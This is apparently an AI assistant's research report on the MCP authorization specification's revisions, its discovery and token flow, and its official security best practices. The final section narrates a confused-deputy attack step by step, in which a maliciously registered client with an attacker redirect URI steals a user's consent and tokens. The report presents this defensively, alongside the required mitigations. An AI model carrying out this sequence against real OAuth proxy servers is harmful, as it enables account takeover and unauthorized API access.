# MCP Authorization Specification: Design, Revision History, and Official Security Best Practices (state as of October 2026)

Revisions covered: 2025-03-26, 2025-06-18, 2025-11-25 and 2026-07-28. The latest published revision is 2026-07-28, released 28 July 2026. Its release candidate appeared 21 May 2026. The `draft` changelog is empty, which means no authorization changes have landed since 2026-07-28.

Abbreviations used below:
- AS = authorization server
- RS = resource server
- PRM = Protected Resource Metadata (RFC 9728)
- CIMD = Client ID Metadata Document
- DCR = Dynamic Client Registration (RFC 7591)
- EMA = Enterprise-Managed Authorization
- ID-JAG = Identity Assertion JWT Authorization Grant

---

## Key Question 1: What does each MCP revision say about authorization, and what changed between revisions?

### Takeaway
MCP authorization has gone through four designs.

1. **2025-03-26:** the MCP server was itself the OAuth authorization server. Endpoints sat at the server's root, with fallbacks to `/authorize`, `/token` and `/register`, and DCR was recommended.
2. **2025-06-18:** the MCP server became a pure OAuth 2.1 resource server. The authorization server is now found through RFC 9728 Protected Resource Metadata, and RFC 8707 `resource` became mandatory.
3. **2025-11-25:** added OIDC discovery, Client ID Metadata Documents as a SHOULD (DCR dropped to MAY), `WWW-Authenticate` scope challenges with step-up, the well-known PRM fallback, and mandatory PKCE capability checks.
4. **2026-07-28:** hardened all of this. It added RFC 9207 `iss` validation, issuer-keyed client credentials, issuer validation of AS metadata, DCR `application_type`, refresh-token guidance and client-side scope union. It formally deprecated DCR, with removal possible from 28 July 2027 onward. It also moved the authorization text into sub-pages.

### Cited Findings

**Text that is the same in every revision (2025-03-26 through 2026-07-28)**
- Authorization is "**OPTIONAL**" for MCP implementations. HTTP-based transports "**SHOULD** conform to this specification". STDIO "**SHOULD NOT** follow this specification, and instead retrieve credentials from the environment". Alternative transports "**MUST** follow established security best practices for their protocol". — [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization); [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- The status-code table is the same in all four revisions:

  | Code | Meaning |
  | --- | --- |
  | 401 | Authorization required or token invalid |
  | 403 | Invalid scopes or insufficient permissions |
  | 400 | Malformed authorization request |

  — [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization); [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- Every revision requires `Authorization: Bearer <access-token>` "in every HTTP request from client to server". Every revision also says access tokens "**MUST NOT** be included in the URI query string". — [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization); [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
  - Revisions up to 2025-11-25 add "even if they are part of the same logical session".
  - 2026-07-28 drops that clause, consistent with its removal of protocol-level sessions. — [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization); [2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)

**Revision 2025-03-26 (first authorization spec; SUPERSEDED)**

Standards and grants:
- Normative basis is OAuth 2.1 draft-12, RFC 8414 and RFC 7591. There was no RFC 9728 and no RFC 8707. — [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization)
- "MCP auth implementations **MUST** implement OAuth 2.1" and "**SHOULD** support" DCR. — same source
- "MCP servers **SHOULD** and MCP clients **MUST** implement" RFC 8414 metadata. — same source
- Two grant types were described: authorization code (for a human user) and client credentials (application-to-application). — same source

Server as authorization server, and endpoint location (SUPERSEDED):
- The example "assumes the MCP server is also functioning as the authorization server". — same source
- The "authorization base URL **MUST** be determined from the MCP server URL by discarding any existing `path` component". The metadata endpoint "**MUST** be at" `https://api.example.com/.well-known/oauth-authorization-server`. — same source
- If metadata discovery returns 404, clients "**MUST** use" default paths `/authorize`, `/token` and `/register` relative to the base URL. — same source
- Clients "*SHOULD* include the header `MCP-Protocol-Version: <protocol-version>` during Server Metadata Discovery". — same source

PKCE and other rules:
- "PKCE is **REQUIRED** for all clients". Redirect URIs "**MUST** be either localhost URLs or HTTPS URLs". Servers "**SHOULD** enforce token expiration and rotation". — same source

"Third-Party Authorization Flow" (SUPERSEDED):
- The MCP server "acts as both an OAuth client (to the third-party auth server) and an OAuth authorization server (to the MCP client)". — same source
- Seven steps, ending with "MCP server generates its own access token bound to the third-party session". — same source
- Session binding: the server **MUST** "Maintain secure mapping between third-party tokens and issued MCP tokens" and "Validate third-party token status before honoring MCP tokens". — same source

**Revision 2025-06-18 (MCP server becomes a resource server; SUPERSEDED by 2025-11-25)**

Changelog entries:
- "Classify MCP servers as OAuth Resource Servers, adding protected resource metadata to discover the corresponding Authorization server" (PR #338). — [2025-06-18 changelog](https://modelcontextprotocol.io/specification/2025-06-18/changelog)
- "Require MCP clients to implement Resource Indicators as described in RFC 8707 to prevent malicious servers from obtaining access tokens" (PR #734). — same source
- New Security Best Practices page, plus clarified security considerations. — same source

Roles and metadata:
- Roles: the MCP server is an "OAuth 2.1 resource server", the MCP client is an "OAuth 2.1 client", and the authorization server "may be hosted with the resource server or a separate entity". — [2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization)
- The standards list adds RFC 9728. OAuth 2.1 moves to draft-13. — same source
- "MCP servers **MUST** implement" RFC 9728, and the PRM document "**MUST** include the `authorization_servers` field containing at least one authorization server". — same source
- In this revision, servers "**MUST** use the HTTP header `WWW-Authenticate` when returning a *401 Unauthorized*" to point to the PRM URL. 2025-11-25 relaxed this. — same source
- AS metadata: "Authorization servers **MUST** provide" RFC 8414 metadata and clients "**MUST** use" it. OIDC Discovery was not yet allowed. — same source
- DCR is still "**SHOULD**". — same source

Resource indicators and token rules:
- New "Resource Parameter Implementation" section. `resource` "**MUST** be included in both authorization requests and token requests" and uses the canonical MCP server URI. Clients "**MUST** send this parameter regardless of whether authorization servers support it". — same source
- New token rules:
  - "MCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience".
  - "MCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server".
  - "MCP servers **MUST NOT** accept or transit any other tokens".
  - The 2025-06-18 text reads "Authorization servers **MUST** only accept tokens that are valid for use with their own resources". 2025-11-25 corrected this to "MCP servers **MUST**…".

  — [2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization); [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization)
- PKCE: "MCP clients **MUST** implement PKCE according to OAuth 2.1 Section 7.5.2". There was no S256 or metadata-verification rule yet. — [2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization)
- The 2025-03-26 base-URL and default-endpoint fallbacks and the "Third-Party Authorization Flow" section are gone. In their place: an MCP server "may act as an OAuth client" to upstream APIs, the upstream token "is a separate token", and the server "**MUST NOT** pass through the token it received from the MCP client". — same source
- Security Considerations sections in this revision:
  - Token Audience Binding and Validation
  - Token Theft
  - Communication Security
  - Authorization Code Protection
  - Open Redirection
  - Confused Deputy Problem
  - Access Token Privilege Restriction

  — same source

**Revision 2025-11-25 (CIMD, OIDC, scopes; SUPERSEDED by 2026-07-28 where noted)**

Changelog entries:
- "Enhance authorization server discovery with support for OpenID Connect Discovery 1.0" (PR #797). — [2025-11-25 changelog](https://modelcontextprotocol.io/specification/2025-11-25/changelog)
- "Enhance authorization flows with incremental scope consent via `WWW-Authenticate`" (SEP-835). — same source
- "Add support for OAuth Client ID Metadata Documents as a recommended client registration mechanism" (SEP-991, PR #1296). — same source
- "Align OAuth 2.0 Protected Resource Metadata discovery with RFC 9728, making `WWW-Authenticate` header optional with fallback to `.well-known` endpoint" (SEP-985). — same source
- URL mode elicitation (SEP-1036). Updated Security Best Practices. — same source
- "Clarify that servers must respond with HTTP 403 Forbidden for invalid Origin headers in Streamable HTTP transport" (PR #1439). — same source

Overview rules:
- AS and clients "**SHOULD** support" CIMD (draft-ietf-oauth-client-id-metadata-document-00). DCR becomes "**MAY**", "included for backwards compatibility". — [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization)
- The AS "**MUST** provide at least one of" RFC 8414 or OIDC Discovery 1.0. Clients "**MUST** support both". — same source

New mechanisms:
- Registration priority: pre-registered, then CIMD (if `client_id_metadata_document_supported`), then DCR (if `registration_endpoint`), then prompting the user. — same source
- Scope Selection Strategy, Scope Challenge Handling (403 `insufficient_scope`) and Step-Up Authorization Flow all appear for the first time. — same source
- PKCE: clients "**MUST** verify PKCE support before proceeding" and "**MUST** use the `S256` code challenge method when technically capable". If `code_challenge_methods_supported` is absent, clients "**MUST** refuse to proceed". AS providing OIDC Discovery "**MUST** include `code_challenge_methods_supported`". — same source
- New "MCP Authorization Extensions" section points to the `ext-auth` repo. Extensions are "Optional", "Additive", "Composable" and "Versioned independently". — same source

Server-side scope accumulation (SUPERSEDED by 2026-07-28):
- Servers chose a "Minimum / Recommended / Extended" approach. Each approach had the server include "existing granted scopes … to prevent clients from losing previously granted permissions". — same source

**Revision 2026-07-28 (current; hardening plus formal DCR deprecation)**

Standards list:
- OAuth 2.1 draft-13
- RFC 6750
- RFC 8414
- RFC 7591
- RFC 8707
- RFC 9728
- RFC 9207 (new)
- draft-ietf-oauth-client-id-metadata-document-00
- OIDC Discovery 1.0
- OIDC Dynamic Client Registration 1.0 (new)

— [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)

Structure:
- The authorization text is now split across sub-pages:
  - [Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery)
  - [Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)
  - [Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- The Security Best Practices page moved to `/docs/2026-07-28/tutorials/security/security_best_practices`. — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)

Changelog authorization items:
- **iss:** "Authorization servers **SHOULD** include the `iss` parameter … and MCP clients **MUST** validate a present `iss` against the recorded issuer before redeeming the authorization code" (SEP-2468). — [2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- **application_type:** "Require MCP clients to specify an appropriate `application_type` during Dynamic Client Registration" (SEP-837). — same source
- **Credential binding:** clients "**MUST** key persisted credentials by the issuer identifier, **MUST NOT** reuse them with a different authorization server, and **MUST** re-register when the authorization server changes" (SEP-2352). — same source
- **DCR deprecation:** "Deprecate the OAuth 2.0 Dynamic Client Registration Protocol … in favor of Client ID Metadata Documents (PR #2858)". DCR "remains available for backwards compatibility". — same source
- **Other authorization SEPs in this release** (named in the release-candidate post):
  - SEP-2207: refresh tokens from OIDC-style AS
  - SEP-2350: scope accumulation during step-up
  - SEP-2351: `.well-known` suffix clarification

  — [RC blog post, 21 May 2026](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/)

DCR deprecation timeline:
- Deprecated in `2026-07-28`. Migration path is CIMD. Earliest removal is the "First revision released on or after 2027-07-28". — [Deprecated features registry](https://modelcontextprotocol.io/specification/2026-07-28/deprecated)
- The lifecycle policy (SEP-2596) sets "a minimum twelve-month deprecation window". — [2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- The DCR section now carries a warning: "Dynamic Client Registration is deprecated. New implementations should use Client ID Metadata Documents instead". — [Client Registration 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)

New normative text:
- **Authorization Response Validation (RFC 9207):**
  - Before redirecting, the client "**MUST** record the `issuer` value from the selected authorization server's validated metadata document and associate it with the same per-request record used to store the PKCE code verifier".
  - The AS "**SHOULD** include the `iss` parameter in authorization responses, including error responses". An AS that does so "**MUST** advertise" `authorization_response_iss_parameter_supported: true`.
  - "A future revision … is expected to upgrade authorization server inclusion of `iss` from **SHOULD** to **MUST**".
  - Clients "**MUST NOT** apply scheme or host case folding, default-port elision, trailing-slash, or percent-encoding normalization" before comparing.
  - On a mismatch, the client "**MUST NOT** act on or display `error`, `error_description`, or `error_uri`".

  — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- **Issuer validation of AS metadata (new):** the metadata `issuer` "**MUST** be identical to the issuer identifier used to construct the well-known URL. If they differ, the client **MUST NOT** use the metadata". — [AS Discovery 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery)
- **Well-known suffix:** "MCP uses the default `oauth-authorization-server` well-known URI suffix … MCP does not define an application-specific well-known URI suffix". — same source
- **Multiple AS:** each listed AS "is an independent OAuth 2.0 authorization server". Clients "**MUST** maintain separate registration state (client credentials, tokens) per authorization server". — same source
- **Authorization Server Binding:** pre-registered or DCR-persisted credentials "**MUST**" be keyed by `issuer`. When the AS changes, clients "**MUST NOT** reuse" them and "**MUST** re-register". "Client IDs based on Client ID Metadata Documents are portable across authorization servers". — [Client Registration 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)
- **application_type:** clients "**MUST** specify an appropriate `application_type`", because omitting it "defaults to `"web"` under OIDC, which can conflict with native-style redirect URIs". Native apps (desktop, mobile, CLI, localhost-served web apps) "**SHOULD** use `application_type: "native"`". — same source
- **Refresh Tokens (new section):**
  - Clients "**MUST** keep refresh tokens confidential" and "**SHOULD** include `refresh_token` in their `grant_types`".
  - Clients "**MAY** add `offline_access` to the `scope` parameter" when the AS lists it in `scopes_supported`.
  - Clients "**MUST NOT** assume refresh tokens will be issued".
  - MCP servers "**SHOULD NOT** include `offline_access` in `WWW-Authenticate` scope or Protected Resource Metadata `scopes_supported`".

  — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- **Step-up, revised (supersedes the 2025-11-25 server-side accumulation):**
  - Clients compute "the union of the client's previously requested scope set and the scopes from the current challenge".
  - "Servers are not required to include the client's previously granted scopes".
  - Servers "**SHOULD** include all scopes required for the current operation in a single challenge".
  - "Servers **MUST** account for scope hierarchies".
  - "Scope accumulation across operations is a client-side responsibility".

  — same source
- **Security Considerations sub-page:** adds a "Mix-Up Attacks" section. Its full list of headings:
  - Token Audience Binding
  - Token Theft
  - Communication Security
  - Authorization Code Protection
  - Mix-Up Attacks
  - Open Redirection
  - CIMD Security
  - Confused Deputy
  - Access Token Privilege Restriction

  — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)

Changes elsewhere in 2026-07-28 that affect authorization:
- "Remove protocol-level sessions and the `Mcp-Session-Id` header" (SEP-2567). — [2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- Remove the `initialize` handshake (SEP-2575). — same source
- Remove `notifications/elicitation/complete` and `elicitationId` from URL-mode elicitation. — same source

Third-party commentary:
- An independent post (Yoshiyuki Tabata, 2 September 2026) describes the same five changes: discovery clarification, `iss`, `application_type`, issuer binding, and step-up/refresh. — [AAIF blog](https://aaif.io/blog/authorization-in-mcp-2026-07-28-clarifying-trust-relationships-for-agentic-systems)
- Vendor commentary notes that DCR's normative downgrade (SHOULD to MAY) actually happened in 2025-11-25, with 2026-07-28 adding the formal deprecation. The primary texts confirm this. — [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization); [SSOJet blog (vendor)](https://ssojet.com/blog/mcp-authorization-spec-2026-07-28-what-changed)

### Inferences
- **Change log suitable for a diagram or table**

  | Element | 2025-03-26 | 2025-06-18 | 2025-11-25 | 2026-07-28 |
  | --- | --- | --- | --- | --- |
  | Server role | MCP server = AS | RS | RS | RS |
  | AS discovery | RFC 8414 at root, or defaults | PRM via `WWW-Authenticate` (MUST) | PRM via header OR well-known | + issuer check of AS metadata |
  | AS metadata | RFC 8414 | RFC 8414 | RFC 8414 or OIDC | RFC 8414 or OIDC |
  | Registration | DCR SHOULD | DCR SHOULD | CIMD SHOULD, DCR MAY | CIMD SHOULD, DCR MAY + deprecated; credentials keyed by issuer |
  | `resource` (RFC 8707) | absent | MUST | MUST | MUST |
  | PKCE | REQUIRED | MUST | MUST + S256 + metadata check | MUST + S256 + metadata check |
  | Scopes | none | none | `WWW-Authenticate` scope + 403 step-up | + client-side union, single challenge |
  | `iss` (RFC 9207) | none | none | none | AS SHOULD send; client MUST validate if present |
  | Refresh guidance | none | none | none | `offline_access` guidance |

- The direction of travel is clear. The spec first separated the AS from the RS (2025-06-18), then removed per-server registration state (CIMD replacing DCR), then closed OAuth multi-AS attack classes such as mix-up and credential reuse across issuers. That matches MCP's many-clients-to-many-servers topology, where one client talks to many authorization servers.
- **Discrepancy in the user's codebase:** `/Users/samin/Documents/MCP-UI/requirement.md` (line 15) says 2026-07-28 makes "a `scope` parameter required in the `401` challenge". The primary text says servers "**SHOULD** include a `scope` parameter", so it is not required. Clients fall back to PRM `scopes_supported` when it is absent. — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- The rest of that codebase line matches the primary sources: CIMD preferred, DCR deprecated, `resource` required, `iss` validation added. Note that `resource` has been required since 2025-06-18, not first in 2026-07-28.

### Gaps
- I did not open the dedicated final release post for 2026-07-28 (blog.modelcontextprotocol.io/posts/2026-07-28/). Release details come from the blog index (date 28 July 2026), the RC post and the changelog.
- I did not fetch the SEP-835, SEP-985, SEP-2350, SEP-2351 or SEP-837 pages themselves. Some of them, such as 2350, 2351, 2352 and 837, do not appear in the modelcontextprotocol.io SEP index, which lists only 42 "Final" SEPs. Their content is described here from the changelog and RC blog post.

---

## Key Question 2: What is the exact discovery and authorization chain a client follows (2026-07-28), with required and optional elements?

### Takeaway
Under 2026-07-28 the client proceeds as follows:
1. Make an unauthenticated request and receive 401.
2. Get the PRM URL from `WWW-Authenticate resource_metadata`. If the header is missing it, probe the path-suffixed well-known URI, then the root one.
3. Read `authorization_servers` from the PRM document.
4. Probe AS metadata in a fixed order across RFC 8414 and OIDC endpoints, and validate the metadata's `issuer`.
5. Check PKCE support.
6. Pick a registration method: pre-registered, then CIMD, then DCR (deprecated), then ask the user.
7. Authorize with PKCE S256, `resource`, `scope` and `state`, after recording the expected issuer.
8. Validate `iss` on the response.
9. Exchange the code with `code_verifier` and `resource`.
10. Send `Authorization: Bearer` on every request.

The server rejects bad tokens with 401 and insufficient scope with 403 `insufficient_scope`.

### Cited Findings

**Step 0–1: unauthenticated request → 401 challenge**
- The client sends an MCP request with no token. The server answers `HTTP 401 Unauthorized` with `WWW-Authenticate`. — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- Example: `WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource", scope="files:read"`. — same source
- Required vs optional: servers "**MUST** implement one of" two mechanisms. Mechanism (1) is the `resource_metadata` parameter in `WWW-Authenticate` on 401 (RFC 9728 §5.1). Mechanism (2) is serving PRM at a well-known URI. — [AS Discovery 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery)
- `scope` in the challenge is **SHOULD**. — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- Clients "**MUST** be able to parse `WWW-Authenticate` headers and respond appropriately to `HTTP 401`". — [AS Discovery 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery)

**Step 2: fetch Protected Resource Metadata (RFC 9728)**
- Clients "**MUST** support both discovery mechanisms". They use the header URL "when present; otherwise, they **MUST** fall back to constructing and requesting the well-known URIs in the order listed":
  1. Path-suffixed: `https://example.com/.well-known/oauth-protected-resource/public/mcp` for an MCP endpoint at `https://example.com/public/mcp`
  2. Root: `https://example.com/.well-known/oauth-protected-resource`

  If neither returns a document: "Abort or use pre-configured values". — same source
- The PRM document "**MUST** include the `authorization_servers` field containing at least one authorization server". If several are listed, the client selects one per RFC 9728 §7.6. — same source
- PRM `scopes_supported` "is intended to represent the minimal set of scopes necessary for basic functionality". — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)

**Step 3: AS metadata discovery (RFC 8414 / OIDC Discovery)**
- For an issuer with a path (e.g. `https://auth.example.com/tenant1`), clients "**MUST** try endpoints in the following priority order":
  1. `https://auth.example.com/.well-known/oauth-authorization-server/tenant1`
  2. `https://auth.example.com/.well-known/openid-configuration/tenant1`
  3. `https://auth.example.com/tenant1/.well-known/openid-configuration`

  — [AS Discovery 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery)
- For an issuer without a path:
  1. `/.well-known/oauth-authorization-server`
  2. `/.well-known/openid-configuration`

  — same source
- **Validation:** the `issuer` in the document "**MUST** be identical to the issuer identifier used to construct the well-known URL". Example: a document fetched from `https://attacker.example/.well-known/oauth-authorization-server` containing `"issuer": "https://honest.example"` "**MUST** be rejected". — same source
- **PKCE gate:** "If `code_challenge_methods_supported` is absent … MCP clients **MUST** refuse to proceed". This applies to both RFC 8414 and OIDC metadata. — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- AS metadata fields the MCP spec relies on:
  - `issuer`
  - `authorization_endpoint`
  - `token_endpoint`
  - `registration_endpoint` (DCR)
  - `code_challenge_methods_supported` (required by MCP)
  - `client_id_metadata_document_supported` (CIMD)
  - `authorization_response_iss_parameter_supported` (RFC 9207)
  - `scopes_supported` (`offline_access`)

  — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization); [Client Registration 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)

**Step 4: client registration (obtain `client_id`)**
- Clients "**MUST** obtain a client ID through one of three registration mechanisms". — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- Clients that support all three "**SHOULD**" use this priority:
  1. Pre-registered client info
  2. CIMD, if the AS metadata has `client_id_metadata_document_supported: true`
  3. DCR, if the AS has a `registration_endpoint`
  4. Prompt the user for client info

  — [Client Registration 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)
- **CIMD, client side:**
  - The `client_id` is an HTTPS URL with a path, e.g. `https://app.example.com/oauth/client-metadata.json`.
  - The document "**MUST** include at least" `client_id`, `client_name` and `redirect_uris`. The `client_id` value "matches the document URL exactly".
  - Clients "**MAY** use `private_key_jwt`".
  - Example fields: `grant_types: ["authorization_code"]`, `response_types: ["code"]`, `token_endpoint_auth_method: "none"`, and redirect URIs `http://127.0.0.1:3000/callback` and `http://localhost:3000/callback`.

  — same source
- **CIMD, AS side:**
  - "**SHOULD** fetch metadata documents when encountering URL-formatted client_ids".
  - "**MUST** validate that the fetched document's `client_id` matches the URL exactly".
  - "**SHOULD** cache metadata respecting HTTP cache headers". SEP-991 recommends a maximum of 24 hours.
  - "**MUST** validate redirect URIs presented in an authorization request against those in the metadata document".
  - On failure, returns `invalid_client` or `invalid_request`.

  — same source; [SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c)
- **CIMD fetch timing:** in the spec's CIMD diagram, the AS authenticates the user first and then fetches the metadata URL. SEP-991 best practice: "Only fetch client metadata after authenticating the user". — [Client Registration 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration); [SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c)
- **DCR (deprecated):** `POST /register` returns client credentials, and `application_type` is required. **Pre-registration:** the client ID is hardcoded or the user enters it. — [Client Registration 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)

**Step 5: authorization request (browser)**
- The client generates PKCE parameters, includes `resource`, applies the scope selection strategy, and records the expected issuer. It then opens the browser with the "authorization URL + code_challenge + resource". — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- PKCE "**MUST**" use `S256` "when technically capable". — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- `resource` "**MUST** be included in both authorization requests and token requests" and must be the MCP server's canonical URI.
  - Valid: `https://mcp.example.com/mcp`, `https://mcp.example.com`, `https://mcp.example.com:8443`.
  - Invalid: `mcp.example.com` (no scheme), `…#fragment`.
  - Prefer no trailing slash.
  - Example: `&resource=https%3A%2F%2Fmcp.example.com`.

  — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- Scope selection order (SHOULD):
  1. The `scope` from the initial 401 `WWW-Authenticate`.
  2. Otherwise all of PRM `scopes_supported`.
  3. If that is undefined, omit `scope`.

  — same source
- Clients "**SHOULD** use and verify state parameters". — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)

**Step 6: authorization response and `iss` validation (RFC 9207, new in 2026-07-28)**
- The AS redirects to the callback "with authorization code + iss". The client validates `iss` "before transmitting the authorization code to any token endpoint", using this decision table:

  | AS advertises `iss` support | `iss` in response | Client action |
  | --- | --- | --- |
  | true | present | compare |
  | true | absent | reject |
  | false or absent | present | compare |
  | false or absent | absent | proceed |

  Comparison is simple string comparison (RFC 3986 §6.2.1). — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)

**Step 7: token request**
- Token request contains "code_verifier + resource". The response is "Access token (+ refresh token)". — same source
- For public clients, the AS "**MUST** rotate refresh tokens". The AS "**SHOULD** issue short-lived access tokens". — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)

**Step 8: resource requests and server validation**
- The client sends `Authorization: Bearer <token>` on "every HTTP request". Tokens never go in the query string. — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- The server validates per OAuth 2.1 §5.2 and checks the audience per RFC 8707 §2. "Invalid or expired tokens **MUST** receive a HTTP 401 response". — same source

**Step 9: runtime insufficient scope → 403 → step-up**
- The server "**SHOULD**" respond with `HTTP 403 Forbidden` plus `WWW-Authenticate: Bearer error="insufficient_scope", scope="files:write", resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource", error_description="…"`. — same source
- Client step-up procedure:
  1. Parse the challenge.
  2. Take the union of previously requested scopes and the challenge scopes.
  3. Re-authorize.
  4. Retry "no more than a few times".

  Clients "**SHOULD** implement retry limits". — same source
- User-delegated clients "**SHOULD**" attempt step-up. `client_credentials` clients "**MAY**" attempt it or abort. — same source

### Inferences
- **Diagram lanes:** Browser, MCP Client, MCP Server (RS + PRM endpoint), Authorization Server, and (for CIMD) the Client Metadata URL host.
- **Required elements:**
  - 401 status
  - A PRM document with `authorization_servers`
  - AS metadata with `code_challenge_methods_supported` and a matching `issuer`
  - PKCE S256
  - `resource` on both the authorize and token legs
  - The Bearer header
  - Audience validation
  - Recording the issuer
- **Optional (SHOULD/MAY) elements:**
  - `scope` in the challenge
  - AS sending `iss` (SHOULD)
  - CIMD (SHOULD)
  - DCR (MAY, deprecated)
  - `offline_access`
  - `state`, which the spec makes SHOULD for clients but MUST for proxy servers in Best Practices

### Gaps
- The spec does not give a full PRM JSON example. Fields beyond `authorization_servers` and `scopes_supported` (e.g. `resource`, `bearer_methods_supported`) are governed by RFC 9728 itself, which I did not fetch.
- The spec does not specify token format (JWT vs opaque) or the introspection method. It only requires validation per OAuth 2.1 §5.2 and an audience check.

---

## Key Question 3: What does the official Security Best Practices document say about confused deputy, token passthrough, SSRF, session/state hijacking, local server compromise, and scope minimization (and what else)?

### Takeaway
The Security Best Practices page has been part of the specification set since 2025-06-18. In 2026-07-28 it lives at `/docs/2026-07-28/tutorials/security/...`. It defines named attacks, each with a narrative and MUST/SHOULD mitigations:
- Confused Deputy (proxy servers with static third-party client IDs)
- Token Passthrough (forbidden)
- SSRF (against clients during discovery, and against AS fetching CIMDs)
- Session Hijacking, renamed "State Handle Hijacking" in 2026-07-28 because sessions were removed
- Local MCP Server Compromise
- OAuth Authorization URL Validation (XSS/RCE)
- stdio proxy escalation
- Mix-Up (new in 2026-07-28)
- Localhost Redirect URI Impersonation
- CIMD Trust Policies
- Scope Minimization

### Cited Findings

**Confused Deputy Problem (MCP proxy servers)**
- **Definitions:**
  - *MCP Proxy Server*: connects MCP clients to third-party APIs "acting as a single OAuth client to the third-party API server".
  - *Static Client ID*: "the same value for all MCP server to Third-Party API interactions regardless of which MCP client initiated the request".

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- **Vulnerable only when all four conditions hold:**
  1. The proxy uses a **static client ID** with the third-party AS.
  2. The proxy lets MCP clients **dynamically register**.
  3. The third-party AS sets a **consent cookie**.
  4. The proxy lacks per-client consent.

  — same source
- **Attack narrative:**
  1. The user authenticates normally via the proxy.
  2. The third-party AS sets a consent cookie for the static client ID.
  3. The attacker dynamically registers a malicious client with `redirect_uri: attacker.com` and sends the user a crafted authorization link.
  4. The user's browser carries the consent cookie.
  5. The third-party AS skips consent.
  6. The third-party code goes to the proxy. The proxy exchanges it and "Generate[s] MCP authorization code", then redirects to attacker.com.
  7. The attacker exchanges the MCP code for an MCP token.
  8. The attacker "impersonates user to MCP server" and gains third-party API access.

  — same source
- **Normative rule in the core spec:** "MCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically registered client before forwarding to third-party authorization servers". Present since 2025-06-18. — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations); [2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization)
- **Mitigations. Proxy servers "MUST implement per-client consent":**
  - **Per-client consent storage (MUST):**
    - "Maintain a registry of approved `client_id` values per user".
    - Check it "**before** initiating the third-party authorization flow".
    - Store decisions securely.
  - **Consent UI (MUST):**
    - Name the client.
    - Show the third-party scopes and the registered `redirect_uri`.
    - CSRF protection.
    - Block iframing via `frame-ancestors` or `X-Frame-Options: DENY`.
  - **Consent cookies (MUST):**
    - `__Host-` prefix.
    - `Secure`, `HttpOnly`, `SameSite=Lax`.
